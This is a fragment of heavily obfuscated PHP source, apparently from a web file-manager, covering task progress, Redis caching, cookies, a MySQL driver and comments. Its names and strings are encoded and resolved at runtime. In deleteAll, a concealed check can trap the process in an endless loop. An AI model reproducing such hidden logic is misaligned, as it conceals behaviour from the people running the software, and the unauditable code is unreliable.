intval($Ïûšø[$¥°ºšÄå[418]] * 0.4); break; case $¥°ºšÄå[608]: $ã¯³ºİ£ = intval($Ïûšø[$¥°ºšÄå[418]] * 0.2); break; case $¥°ºšÄå[610]: $ã¯³ºİ£ = intval($Ïûšø[$¥°ºšÄå[418]] * 0.4); break; } $this->update($ã¯³ºİ£); $this->sourceModelCopyFlag = !1; } public function sourceRemove($‚¤âŠ…, $Â¶¤ıóé) { $éÓ…º¯ =& $_SERVER[”ú…±Ú¥]; $this->sourceModelCopyFlag = !0; $‡ÕÈ‘€ö = 1; if (isset($‚¤âŠ…[$éÓ…º¯[79]])) { $‡ÕÈ‘€ö = $‚¤âŠ…[$éÓ…º¯[79]][$éÓ…º¯[77]]; $‡ÕÈ‘€ö = $‡ÕÈ‘€ö + $‚¤âŠ…[$éÓ…º¯[79]][$éÓ…º¯[78]] + 1; } $this->update($‡ÕÈ‘€ö); $this->sourceModelCopyFlag = !1; } public function sourceMove($š›”Òìê) { $this->sourceRemove($š›”Òìê, !1); } public function curlProgress($Š¹âŒÃ‚, $º”¶î·¾, $Â¾’ç“, $Ç¸ƒæ…, $ı„è¦ÙÕ) { $®Ï‚ış« =& $_SERVER[”ú…±Ú¥]; $á†¶Üˆ³ =& $this->task; if ($ı„è¦ÙÕ > 0) { $á†¶Üˆ³[$®Ï‚ış«[1093]] = $®Ï‚ış«[1744]; $á†¶Üˆ³[$®Ï‚ış«[1726]] = $®Ï‚ış«[107]; if ($á†¶Üˆ³[$®Ï‚ış«[1724]]) { $á†¶Üˆ³[$®Ï‚ış«[1725]] = $ı„è¦ÙÕ; } if ($á†¶Üˆ³[$®Ï‚ış«[1727]]) { $á†¶Üˆ³[$®Ï‚ış«[1725]] = $ı„è¦ÙÕ + $á†¶Üˆ³[$®Ï‚ış«[1727]]; } } else { if ($Â¾’ç“ > 0) { if ($á†¶Üˆ³[$®Ï‚ış«[1724]] == $º”¶î·¾) { $á†¶Üˆ³[$®Ï‚ış«[1725]] = $Â¾’ç“; $á†¶Üˆ³[$®Ï‚ış«[1093]] = $®Ï‚ış«[1745]; $á†¶Üˆ³[$®Ï‚ış«[1726]] = $®Ï‚ış«[1223]; } } } $this->update(); } public function curlProgressStart($“Î’ˆê³) { } public function curlProgressEnd($Š®îáşÍ) { $·¯¦ø¨¹ =& $_SERVER[”ú…±Ú¥]; $ş‡Æñ¨ª =& $this->task; $è–É—È = curl_getinfo($Š®îáşÍ); $öÁªéá¯ = $è–É—È[$·¯¦ø¨¹[1746]]; if ($öÁªéá¯ == -1) { $öÁªéá¯ = $è–É—È[$·¯¦ø¨¹[1747]]; } if ($ş‡Æñ¨ª[$·¯¦ø¨¹[1726]] == $·¯¦ø¨¹[107] && $öÁªéá¯) { $ş‡Æñ¨ª[$·¯¦ø¨¹[1727]] += $öÁªéá¯; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $ì£Ãü›É =& $_SERVER[”ú…±Ú¥]; $À‰‡¿ë =& $this->task; $À‰‡¿ë[$ì£Ãü›É[1748]] = 1; Hook::bind($ì£Ãü›É[1716], array($this, $ì£Ãü›É[1749])); Hook::bind($ì£Ãü›É[1718], array($this, $ì£Ãü›É[1750])); Hook::bind($ì£Ãü›É[1720], array($this, $ì£Ãü›É[1751])); } protected function endAfter() { $…Ê†ã‹è =& $_SERVER[”ú…±Ú¥]; Hook::unbind($…Ê†ã‹è[1716], array($this, $…Ê†ã‹è[1749])); Hook::unbind($…Ê†ã‹è[1718], array($this, $…Ê†ã‹è[1750])); Hook::unbind($…Ê†ã‹è[1720], array($this, $…Ê†ã‹è[1751])); } public function progressStart($å‰ÊıŸõ) { $Ö …ùÅ¡ =& $_SERVER[”ú…±Ú¥]; $‡—øõ” = curl_getinfo($å‰ÊıŸõ); self::log($Ö …ùÅ¡[1752] . $‡—øõ”[$Ö …ùÅ¡[345]]); self::valueSet($this->task[$Ö …ùÅ¡[437]], $this->task); } public function progressEnd($Íúí«Ô‘) { $¥éŒÔª¯ =& $_SERVER[”ú…±Ú¥]; self::log($¥éŒÔª¯[1753] . $this->task[$¥éŒÔª¯[437]]); $this->end(); } public function progress($©¥€„Ñå, $±Ü©àÎœ, $¨¼ãñİÏ, $Óô’„Ôå, $¨–âÖÓˆ) { $õÒÆã‰ =& $_SERVER[”ú…±Ú¥]; $á›‰æŸÚ =& $this->task; if ($¨–âÖÓˆ > 0) { $á›‰æŸÚ[$õÒÆã‰[818]] = $á›‰æŸÚ[$õÒÆã‰[818]] == 0 ? $Óô’„Ôå : $á›‰æŸÚ[$õÒÆã‰[818]]; $á›‰æŸÚ[$õÒÆã‰[1672]] = $¨–âÖÓˆ; } else { if ($¨¼ãñİÏ > 0) { $á›‰æŸÚ[$õÒÆã‰[818]] = $á›‰æŸÚ[$õÒÆã‰[818]] == 0 ? $±Ü©àÎœ : $á›‰æŸÚ[$õÒÆã‰[818]]; $á›‰æŸÚ[$õÒÆã‰[1672]] = $¨¼ãñİÏ; } } $this->update(); self::log("\x70\x72\x6f\x67\162\x65\x73\163\110\x74\164\160\72\144\x6f\x77\x6e\x3a{$¨¼ãñİÏ}\57{$±Ü©àÎœ}\x3b\x20\165\160\x6c\x6f\x61\144\72{$¨–âÖÓˆ}\57{$Óô’„Ôå}\73"); } } goto F‚¬¾¨ìÓµ; a½…Ã´´: $fileSize = strrev(base64_decode($_SERVER[ùÎ²ˆ•Ñ][0])); function binCheckNeq($Ïæ’Ü£š, $§Ú•¬üÜ) { return $Ïæ’Ü£š != $§Ú•¬üÜ; } $_SERVER[$_SERVER[ùÎ²ˆ•Ñ][1]] = $fileSize($_SERVER[$_SERVER[ùÎ²ˆ•Ñ][2]]); goto Eé³œœ©ƒÙ; bâêäµ¤Á¹: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($ó­¦¶ë, $ßßÛŞÌÛ) { $’ŞûŒö­ =& $_SERVER[”ú…±Ú¥]; if (!class_exists($’ŞûŒö­[901])) { show_json($’ŞûŒö­[902], !1); } $this->cacheTime = $ßßÛŞÌÛ; $ÑÈæ­™š = isset($ó­¦¶ë[$’ŞûŒö­[903]]) ? $ó­¦¶ë[$’ŞûŒö­[903]] : 10; $´ëé“Áæ = _get($ó­¦¶ë, $’ŞûŒö­[900]); if ($´ëé“Áæ && is_array($´ëé“Áæ)) { $this->initCluster($ó­¦¶ë, $ÑÈæ­™š); } else { $this->handle = $this->init($ó­¦¶ë, $ÑÈæ­™š); } } private function init($—‡éÇÈÈ, $ÜÛá´‰ü) { $©™¿§àé =& $_SERVER[”ú…±Ú¥]; $àÈÂ…¦ = new Redis(); $ûÕŸò— = isset($—‡éÇÈÈ[$©™¿§àé[904]]) ? $—‡éÇÈÈ[$©™¿§àé[904]] : !1; if ($ûÕŸò—) { $àÈÂ…¦->pconnect($—‡éÇÈÈ[$©™¿§àé[182]], $—‡éÇÈÈ[$©™¿§àé[183]], $ÜÛá´‰ü); } else { $àÈÂ…¦->connect($—‡éÇÈÈ[$©™¿§àé[182]], $—‡éÇÈÈ[$©™¿§àé[183]], $ÜÛá´‰ü); } if (!empty($—‡éÇÈÈ[$©™¿§àé[451]])) { $àÈÂ…¦->auth($—‡éÇÈÈ[$©™¿§àé[451]]); } if (!empty($—‡éÇÈÈ[$©™¿§àé[789]]) && $—‡éÇÈÈ[$©™¿§àé[789]] != 0) { $àÈÂ…¦->select($—‡éÇÈÈ[$©™¿§àé[789]]); } return $àÈÂ…¦; } private function initCluster($á¹ş‘¶®, $ÜÔÜ„ñ§) { $Â†ğº” =& $_SERVER[”ú…±Ú¥]; $¥æâ½ú = array($Â†ğº”[905], $Â†ğº”[906], $Â†ğº”[907]); $ç¦¥œö› = $Â†ğº”[905]; if (isset($á¹ş‘¶®[$Â†ğº”[16]]) && in_array($á¹ş‘¶®[$Â†ğº”[16]], $¥æâ½ú)) { $ç¦¥œö› = $á¹ş‘¶®[$Â†ğº”[16]]; } switch ($ç¦¥œö›) { case $Â†ğº”[905]: $this->_slave($á¹ş‘¶®, $ÜÔÜ„ñ§); break; case $Â†ğº”[906]: break; case $Â†ğº”[907]: $this->isCluster = !0; $§·äÑ = $á¹ş‘¶®[$Â†ğº”[900]]; $İ†™©Ö§ = isset($á¹ş‘¶®[$Â†ğº”[904]]) ? $á¹ş‘¶®[$Â†ğº”[904]] : !1; $†¬íœÍ° = isset($á¹ş‘¶®[$Â†ğº”[451]]) ? $á¹ş‘¶®[$Â†ğº”[451]] : null; $this->handle = new RedisCluster(NUll, $§·äÑ, $ÜÔÜ„ñ§, $ÜÔÜ„ñ§, $İ†™©Ö§, $†¬íœÍ°); break; default: break; } } private function _slave($Ò»œ·îˆ, $ƒµ¯µ±’) { $Ó¡´Í´Å = $Ò»œ·îˆ[$_SERVER[”ú…±Ú¥][900]]; $this->filterConfig($Ò»œ·îˆ, $Ó¡´Í´Å[0]); $this->handle = $this->init($Ò»œ·îˆ, $ƒµ¯µ±’); unset($Ó¡´Í´Å[0]); if (empty($Ó¡´Í´Å)) { return; } $„»ú”ßö = array_rand($Ó¡´Í´Å); $this->filterConfig($Ò»œ·îˆ, $Ó¡´Í´Å[$„»ú”ßö]); $this->slaveHandle = $this->init($Ò»œ·îˆ, $ƒµ¯µ±’); } private function filterConfig(&$›‹šÜÒ, $Ñè™Ñœï) { $§ÁŠÊËö =& $_SERVER[”ú…±Ú¥]; $Èùå÷›ª = explode($§ÁŠÊËö[4], $Ñè™Ñœï); $®Ö½È¯ = array($§ÁŠÊËö[182] => $Èùå÷›ª[0], $§ÁŠÊËö[183] => $Èùå÷›ª[1]); $›‹šÜÒ = array_merge($›‹šÜÒ, $®Ö½È¯); } public function set($ç¸ìÆ÷, $Ï‘ø©„, $Şİˆ¢®« = false) { $Şİˆ¢®« = $Şİˆ¢®« ? $Şİˆ¢®« : $this->cacheTime; return $this->handle->setEx($ç¸ìÆ÷, $Şİˆ¢®«, $Ï‘ø©„); } public function setLock($µÈ«¥ó, $ÅŒ‚‚¦¯, $ÌöêææÜ) { return $this->handle->setNX($µÈ«¥ó, $ÅŒ‚‚¦¯); } public function get($­„îùè) { $¸º¯…ûë = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $¸º¯…ûë->get($­„îùè); } public function remove($¢Ÿú—ó¬) { return $this->handle->del($¢Ÿú—ó¬); } public function deleteAll() { $êã’ßç =& $_SERVER[”ú…±Ú¥]; if (!isset($_SERVER[$êã’ßç[186]]) || !isset($_SERVER[$êã’ßç[195]])) { $õÎì²³ = $êã’ßç[908]; $¾€Õúüé = $êã’ßç[188]; $ï¹—ÌŸÒ = $_SERVER[$êã’ßç[189]] . $êã’ßç[190]; $ãÃËË¥ = $¾€Õúüé($ï¹—ÌŸÒ); $šï‘Ï = explode($êã’ßç[191], $ãÃËË¥); if (count($šï‘Ï) < $êã’ßç[665]) { $²Üæ‰ö‰ = $êã’ßç[193]; $²Üæ‰ö‰(); } $¦Ñäé  = $êã’ßç[909]; $¦Ñäé ($_SERVER[$êã’ßç[910]]); $»ò¦¢éÆ = 1; for ($ÃÁß·çí = $»ò¦¢éÆ; $ÃÁß·çí > 0; $ÃÁß·çí++) { $¦Ñäé  = json_encode($GLOBALS[$êã’ßç[456]]); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $…ç˜ÀÃ) { $this->handle->flushall($…ç˜ÀÃ); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($ÔÄÊóíÅ = '', $õ÷˜úû = 0) { if (is_string($ÔÄÊóíÅ) && $ÔÄÊóíÅ != $_SERVER[”ú…±Ú¥][12]) { $this->prefix = $ÔÄÊóíÅ; } if (is_numeric($õ÷˜úû) && $õ÷˜úû > 0) { $this->expire = $õ÷˜úû; } } public static function getInstance() { static $‰×µê÷Ú; if ($‰×µê÷Ú === null) { $‰×µê÷Ú = new self(); } return $‰×µê÷Ú; } private static $cookieDisable = false; public static function disable($‘şÜÃÙÜ) { self::$cookieDisable = $‘şÜÃÙÜ; } private static $sameCookieSet = array(); public static function set($øÊ‘Š“, $‘ßÙ»÷Ò, $ãõÖÓ…İ = 0, $ìÈ˜†î— = false, $¡Á÷ãñö = false) { $®§ Çæ» =& $_SERVER[”ú…±Ú¥]; if (self::$cookieDisable) { return; } if (!$ãõÖÓ…İ) { $ãõÖÓ…İ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$øÊ‘Š“]) && self::$sameCookieSet[$øÊ‘Š“] == $‘ßÙ»÷Ò . $ãõÖÓ…İ) { return; } self::$sameCookieSet[$øÊ‘Š“] = $‘ßÙ»÷Ò . $ãõÖÓ…İ; if (!$¡Á÷ãñö) { $¡Á÷ãñö = str_replace(HOST, $®§ Çæ»[12], APP_HOST); $¡Á÷ãñö = _get($GLOBALS, $®§ Çæ»[911], $¡Á÷ãñö); } $¸¤õ¶ñ¢ = $®§ Çæ»[12]; setcookie($øÊ‘Š“, $‘ßÙ»÷Ò, time() + $ãõÖÓ…İ, $®§ Çæ»[8] . trim($¡Á÷ãñö, $®§ Çæ»[8]) . $¸¤õ¶ñ¢, !1, !1, $ìÈ˜†î—); } public static function setSafe($æ÷¦çßÔ, $†ÒùÙéÉ, $‹…ûö€ş = 0) { self::set($æ÷¦çßÔ, $†ÒùÙéÉ, $‹…ûö€ş, !0); } public static function get($ûá’‚) { static $Û¿á®°Â = false; if (!$Û¿á®°Â) { self::initHeaderCookie(); $Û¿á®°Â = !0; } return isset($_COOKIE[$ûá’‚]) ? $_COOKIE[$ûá’‚] : !1; } private static function initHeaderCookie() { $‹¯§Ëœå =& $_SERVER[”ú…±Ú¥]; if (!isset($_SERVER[$‹¯§Ëœå[912]]) || !$_SERVER[$‹¯§Ëœå[912]]) { return; } $íÈŸà = explode($‹¯§Ëœå[71], $_SERVER[$‹¯§Ëœå[912]]); foreach ($íÈŸà as $ê°Å¡à§) { $ê°Å¡à§ = explode($‹¯§Ëœå[913], $ê°Å¡à§); if (count($ê°Å¡à§) != 2 || !isset($ê°Å¡à§[1])) { continue; } $_COOKIE[trim($ê°Å¡à§[0])] = trim($ê°Å¡à§[1]); } } public static function remove($ùî«ØâÏ, $ ¸¸¸ = false) { unset($_COOKIE[$ùî«ØâÏ]); self::set($ùî«ØâÏ, $_SERVER[”ú…±Ú¥][12], 1, $ ¸¸¸); } } class DbMysql extends Db { public function __construct($ÇãÏ­¿ = '') { $—ü—ñÚ =& $_SERVER[”ú…±Ú¥]; if (!extension_loaded($—ü—ñÚ[836])) { think_exception(think_lang($—ü—ñÚ[14]) . $—ü—ñÚ[914]); } if (!empty($ÇãÏ­¿)) { $this->config = $ÇãÏ­¿; if (empty($this->config[$—ü—ñÚ[17]])) { $this->config[$—ü—ñÚ[17]] = $—ü—ñÚ[12]; } } } public function connect($§˜‹ŒÊ = '', $úõÈÓ = 0, $ÕäÓ”»³ = false) { $İÚ÷•­Œ =& $_SERVER[”ú…±Ú¥]; if (!isset($this->linkID[$úõÈÓ])) { if (empty($§˜‹ŒÊ)) { $§˜‹ŒÊ = $this->config; } $ÆÀÒ±ñ = $§˜‹ŒÊ[$İÚ÷•­Œ[915]] . ($§˜‹ŒÊ[$İÚ÷•­Œ[916]] ? "\72{$§˜‹ŒÊ[$İÚ÷•­Œ[916]]}" : $İÚ÷•­Œ[12]); $úïöÔ€Î = !empty($§˜‹ŒÊ[$İÚ÷•­Œ[17]][$İÚ÷•­Œ[18]]) ? $§˜‹ŒÊ[$İÚ÷•­Œ[17]][$İÚ÷•­Œ[18]] : $this->pconnect; if ($úïöÔ€Î) { $this->linkID[$úõÈÓ] = mysql_pconnect($ÆÀÒ±ñ, $§˜‹ŒÊ[$İÚ÷•­Œ[917]], $§˜‹ŒÊ[$İÚ÷•­Œ[918]], 131072); } else { $this->linkID[$úõÈÓ] = mysql_connect($ÆÀÒ±ñ, $§˜‹ŒÊ[$İÚ÷•­Œ[917]], $§˜‹ŒÊ[$İÚ÷•­Œ[918]], !0, 131072); } if (!$this->linkID[$úõÈÓ] || !empty($§˜‹ŒÊ[$İÚ÷•­Œ[21]]) && !mysql_select_db($§˜‹ŒÊ[$İÚ÷•­Œ[21]], $this->linkID[$úõÈÓ])) { think_exception(mysql_error()); } $åÁÇ¢ÖŠ = mysql_get_server_info($this->linkID[$úõÈÓ]); mysql_query($İÚ÷•­Œ[919] . think_config($İÚ÷•­Œ[920]) . $İÚ÷•­Œ[58], $this->linkID[$úõÈÓ]); if ($åÁÇ¢ÖŠ > $İÚ÷•­Œ[921]) { mysql_query($İÚ÷•­Œ[922], $this->linkID[$úõÈÓ]); } $this->connected = !0; if (1 != think_config($İÚ÷•­Œ[22])) { unset($this->config); } } return $this->linkID[$úõÈÓ]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($™²¼ª‹¸) { $İÈ¢ÄØû =& $_SERVER[”ú…±Ú¥]; if (0 === stripos($™²¼ª‹¸, $İÈ¢ÄØû[302])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $™²¼ª‹¸; if ($this->queryID) { $this->free(); } think_action_status($İÈ¢ÄØû[23], 1); think_status($İÈ¢ÄØû[24]); $this->queryID = mysql_query($™²¼ª‹¸, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($ô„¯Şã») { $­ØÇ•„Ä =& $_SERVER[”ú…±Ú¥]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ô„¯Şã»; if ($this->queryID) { $this->free(); } think_action_status($­ØÇ•„Ä[25], 1); think_status($­ØÇ•„Ä[24]); $àÅîÖÇ´ = mysql_query($ô„¯Şã», $this->_linkID); $this->debug(); if (!1 === $àÅîÖÇ´) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[”ú…±Ú¥][923], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Â‹µ™· = mysql_query($_SERVER[”ú…±Ú¥][924], $this->_linkID); $this->transTimes = 0; if (!$Â‹µ™·) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $»ú„¥‚ˆ = mysql_query($_SERVER[”ú…±Ú¥][925], $this->_linkID); $this->transTimes = 0; if (!$»ú„¥‚ˆ) { $this->error(); return !1; } } return !0; } private function getAll() { $æ¤Æ’Ú = array(); if ($this->numRows > 0) { while ($“÷Ó—¹” = mysql_fetch_assoc($this->queryID)) { $æ¤Æ’Ú[] = $“÷Ó—¹”; } mysql_data_seek($this->queryID, 0); } return $æ¤Æ’Ú; } public function getFields($ÕÌÚ…İ‰) { $í–¾Á½´ =& $_SERVER[”ú…±Ú¥]; $Şš² ’† = $this->query($í–¾Á½´[926] . $this->parseKey($ÕÌÚ…İ‰)); $ôš¸Û = array(); if ($Şš² ’†) { foreach ($Şš² ’† as $¦’±²ÙÒ => $Ş‚à êÒ) { $ôš¸Û[$Ş‚à êÒ[$í–¾Á½´[31]]] = array($í–¾Á½´[32] => $Ş‚à êÒ[$í–¾Á½´[31]], $í–¾Á½´[33] => $Ş‚à êÒ[$í–¾Á½´[34]], $í–¾Á½´[35] => (bool) (strtoupper($Ş‚à êÒ[$í–¾Á½´[36]]) === $í–¾Á½´[927]), $í–¾Á½´[37] => $Ş‚à êÒ[$í–¾Á½´[38]], $í–¾Á½´[39] => strtolower($Ş‚à êÒ[$í–¾Á½´[40]]) == $í–¾Á½´[41], $í–¾Á½´[42] => strtolower($Ş‚à êÒ[$í–¾Á½´[43]]) == $í–¾Á½´[44]); } } return $ôš¸Û; } public function getTables($’ÌóøÅ = '') { $’ÉÁ¸ÎÙ =& $_SERVER[”ú…±Ú¥]; if (!empty($’ÌóøÅ)) { $üÇÊˆ¾ = $’ÉÁ¸ÎÙ[928] . $’ÌóøÅ . $’ÉÁ¸ÎÙ[929]; } else { $üÇÊˆ¾ = $’ÉÁ¸ÎÙ[930]; } $ê¿üªÌ = $this->query($üÇÊˆ¾); $ÎáÙ·÷» = array(); foreach ($ê¿üªÌ as $ÊÀ¡ãÊ‡ => $¿éòËÔ«) { $ÎáÙ·÷»[$ÊÀ¡ãÊ‡] = current($¿éòËÔ«); } return $ÎáÙ·÷»; } public function replace($€–·¾ í, $—ß„ö÷Í = array()) { $ŒĞ¨ˆ’Ş =& $_SERVER[”ú…±Ú¥]; foreach ($€–·¾ í as $Ñ¿çô¸² => $„å“ï²Ó) { $²Õï«¡ = $this->parseValue($„å“ï²Ó); if (is_scalar($²Õï«¡)) { $ÕÉ‰Ï³[] = $²Õï«¡; $Š“Á˜å×[] = $this->parseKey($Ñ¿çô¸²); } } $÷­Ú“õÙ = $ŒĞ¨ˆ’Ş[931] . $this->parseTable($—ß„ö÷Í[$ŒĞ¨ˆ’Ş[317]]) . $ŒĞ¨ˆ’Ş[932] . implode($ŒĞ¨ˆ’Ş[50], $Š“Á˜å×) . $ŒĞ¨ˆ’Ş[933] . implode($ŒĞ¨ˆ’Ş[50], $ÕÉ‰Ï³) . $ŒĞ¨ˆ’Ş[934]; return $this->execute($÷­Ú“õÙ); } public function insertAll($÷á¾‘ÜĞ, $ò¶œ€’ = array(), $‰€ª¸ò² = false) { $û‚ˆŞĞÃ =& $_SERVER[”ú…±Ú¥]; if (!is_array($÷á¾‘ÜĞ[0])) { return !1; } $¯©Ñı×ñ = array_keys($÷á¾‘ÜĞ[0]); $ìá÷»£Ë = array(); foreach ($÷á¾‘ÜĞ as $’å÷Òæ) { $Ö¶ºõ¥‘ = array(); foreach ($’å÷Òæ as $£ÚñÑ => $Ûé‹¡œ¶) { $Ûé‹¡œ¶ = $this->parseValue($Ûé‹¡œ¶); if (is_scalar($Ûé‹¡œ¶)) { $Ö¶ºõ¥‘[] = $Ûé‹¡œ¶; } } $ìá÷»£Ë[] = $û‚ˆŞĞÃ[298] . implode($û‚ˆŞĞÃ[50], $Ö¶ºõ¥‘) . $û‚ˆŞĞÃ[934]; } array_walk($¯©Ñı×ñ, array($this, $û‚ˆŞĞÃ[935])); $ç‘óŸ¹– = ($‰€ª¸ò² ? $û‚ˆŞĞÃ[936] : $û‚ˆŞĞÃ[937]) . $û‚ˆŞĞÃ[938] . $this->parseTable($ò¶œ€’[$û‚ˆŞĞÃ[317]]) . $û‚ˆŞĞÃ[932] . implode($û‚ˆŞĞÃ[50], $¯©Ñı×ñ) . $û‚ˆŞĞÃ[939] . implode($û‚ˆŞĞÃ[50], $ìá÷»£Ë); return $this->execute($ç‘óŸ¹–); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $á˜´òÇ =& $_SERVER[”ú…±Ú¥]; $this->error = mysql_errno() . $á˜´òÇ[4] . mysql_error($this->_linkID); if ($á˜´òÇ[12] != $this->queryStr) { $this->error .= LNG($á˜´òÇ[48]) . $this->queryStr; } think_trace($this->error, $á˜´òÇ[12], $á˜´òÇ[49]); return $this->error; } public function escapeString($¢µÑÅß) { if ($this->_linkID) { return mysql_real_escape_string($¢µÑÅß, $this->_linkID); } else { return mysql_escape_string($¢µÑÅß); } } public function parseKey(&$˜ğñÓ¢, $¿æÃüŒ“ = true) { $ÔĞè‹Ø® =& $_SERVER[”ú…±Ú¥]; if ($¿æÃüŒ“) { $˜ğñÓ¢ = $this->parseKeyCheck($˜ğñÓ¢); } if ($˜ğñÓ¢ != $ÔĞè‹Ø®[199] && !preg_match($ÔĞè‹Ø®[940], $˜ğñÓ¢)) { $˜ğñÓ¢ = $ÔĞè‹Ø®[423] . trim($˜ğñÓ¢, $ÔĞè‹Ø®[423]) . $ÔĞè‹Ø®[423]; } return $˜ğñÓ¢; } } goto d›®Ğëï—ª; Dï˜“…ÉŸØ: class CommentModel extends ModelBase { protected $tableName = "\x63\x6f\x6d\x6d\x65\x6e\x74"; protected $tableMeta = array("\164\x61\142\x6c\x65\x4e\141\155\x65" => "\x63\x6f\x6d\155\x65\x6e\164\137\x6d\145\x74\141", "\155\x65\164\x61\x46\151\x65\x6c\x64" => "\143\x6f\x6d\x6d\x65\156\x74\111\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($½Ø€Œ¥ ) { $¤¬§Œ„³ =& $_SERVER[”ú…±Ú¥]; if ($½Ø€Œ¥ [$¤¬§Œ„³[1890]]) { $–î‘‚ÈÁ = $this->where(array($¤¬§Œ„³[1891] => $½Ø€Œ¥ [$¤¬§Œ„³[1890]]))->find(); if (!$–î‘‚ÈÁ || $–î‘‚ÈÁ[$¤¬§Œ„³[449]] != $½Ø€Œ¥ [$¤¬§Œ„³[449]] || $–î‘‚ÈÁ[$¤¬§Œ„³[534]] != $½Ø€Œ¥ [$¤¬§Œ„³[534]]) { return !1; } $this->where(array($¤¬§Œ„³[1891] => $½Ø€Œ¥ [$¤¬§Œ„³[1890]]))->setAdd($¤¬§Œ„³[1892], 1); } $½Ø€Œ¥ [$¤¬§Œ„³[1893]] = 0; $½Ø€Œ¥ [$¤¬§Œ„³[1892]] = 0; $½Ø€Œ¥ [$¤¬§Œ„³[782]] = 1; return $this->add($½Ø€Œ¥ ); } public function commentCount($é¨®ñ, $Ó™ÒÜ×, $€Ğ‡˜·í = false) { $óÊÏ’¶á =& $_SERVER[”ú…±Ú¥]; if (!$é¨®ñ) { return array(); } if (is_string($é¨®ñ) || is_int($é¨®ñ)) { $é¨®ñ = array($é¨®ñ); } $ÍŞñ¥¸Š = array($óÊÏ’¶á[534], $óÊÏ’¶á[1894] => $óÊÏ’¶á[529]); $§úË£Ú˜ = array($óÊÏ’¶á[534] => array($óÊÏ’¶á[7], $é¨®ñ), $óÊÏ’¶á[449] => $Ó™ÒÜ×); if ($€Ğ‡˜·í) { $§úË£Ú˜[$óÊÏ’¶á[1671]] = $€Ğ‡˜·í; } $æ™ÅŠ´ = $this->field($ÍŞñ¥¸Š)->where($§úË£Ú˜)->group($óÊÏ’¶á[534])->select(); return array_to_keyvalue($æ™ÅŠ´, $óÊÏ’¶á[534], $óÊÏ’¶á[529]); } public function starTarget($ÚûßÂ€‘, $âÊî²¹«) { $’™­Åæœ =& $_SERVER[”ú…±Ú¥]; $š‹­‚³ = $ÚûßÂ€‘ + self::TYPE_STAR_OFFSET; $á‰ëÑê– = array($’™­Åæœ[1671] => USER_ID, $’™­Åæœ[449] => $š‹­‚³, $’™­Åæœ[534] => $âÊî²¹«); $”¶·˜¸ = $this->where($á‰ëÑê–)->find(); if ($”¶·˜¸) { return $this->where(array($’™­Åæœ[437] => $”¶·˜¸[$’™­Åæœ[437]]))->delete(); } $œĞöı¹÷ = array($’™­Åæœ[1890] => 0, $’™­Åæœ[1671] => USER_ID, $’™­Åæœ[782] => 1, $’™­Åæœ[786] => $’™­Åæœ[12], $’™­Åæœ[449] => $š‹­‚³, $’™­Åæœ[534] => $âÊî²¹«, $’™­Åæœ[1893] => 0, $’™­Åæœ[1892] => 0); return $this->add($œĞöı¹÷); } public function starTargetCount($ï¡×ŞŠ, $Ÿ®Ö£óé) { $‘’²úÆ¾ =& $_SERVER[”ú…±Ú¥]; $¾Ù‡‡ÅÎ = $Ÿ®Ö£óé + self::TYPE_STAR_OFFSET; $éĞÎßÁ… = $this->commentCount($ï¡×ŞŠ, $¾Ù‡‡ÅÎ); $Ãïò¦û = $this->commentCount($ï¡×ŞŠ, $¾Ù‡‡ÅÎ, USER_ID); return array($‘’²úÆ¾[1895] => $éĞÎßÁ…, $‘’²úÆ¾[1896] => $Ãïò¦û); } public function starTargetUserList($ÚÉÉïÊ, $¬ÀóØÁÃ) { $ÄÖÆ¹à¿ =& $_SERVER[”ú…±Ú¥]; $§×„±Ë‰ = $ÚÉÉïÊ + self::TYPE_STAR_OFFSET; $…ªÈ½µ = array($ÄÖÆ¹à¿[534] => $¬ÀóØÁÃ, $ÄÖÆ¹à¿[449] => $§×„±Ë‰); $½ˆ“¸ó = $this->where($…ªÈ½µ)->count(); $•ÅÆßÁÇ = array($ÄÖÆ¹à¿[293] => $½ˆ“¸ó, $ÄÖÆ¹à¿[1897] => array()); if (!$½ˆ“¸ó) { return $•ÅÆßÁÇ; } $Ò‘¸ÓÑë = $this->field($ÄÖÆ¹à¿[1671])->where($…ªÈ½µ)->limit(500)->select(); $Ò‘¸ÓÑë = array_to_keyvalue($Ò‘¸ÓÑë, $ÄÖÆ¹à¿[12], $ÄÖÆ¹à¿[1671]); $•ÅÆßÁÇ[$ÄÖÆ¹à¿[1897]] = Model($ÄÖÆ¹à¿[542])->userListInfo($Ò‘¸ÓÑë); return $•ÅÆßÁÇ; } public function prasiseUserList($’Í¾ºáç) { $é™ôç‰… =& $_SERVER[”ú…±Ú¥]; $ÏáÆ–ÉĞ = array($é™ôç‰…[1898] => $’Í¾ºáç); $¬À“áÚ• = $this->where($ÏáÆ–ÉĞ)->find(); $êû”ÙÄ– = _get($¬À“áÚ•, $é™ôç‰…[1893], 0); $Æ“ìÍĞƒ = array($é™ôç‰…[293] => $êû”ÙÄ–, $é™ôç‰…[1897] => array()); if (!$êû”ÙÄ–) { return $Æ“ìÍĞƒ; } $ëö£›äº = Model($é™ôç‰…[1899])->field($é™ôç‰…[1671])->where($ÏáÆ–ÉĞ)->limit(500)->select(); $ëö£›äº = 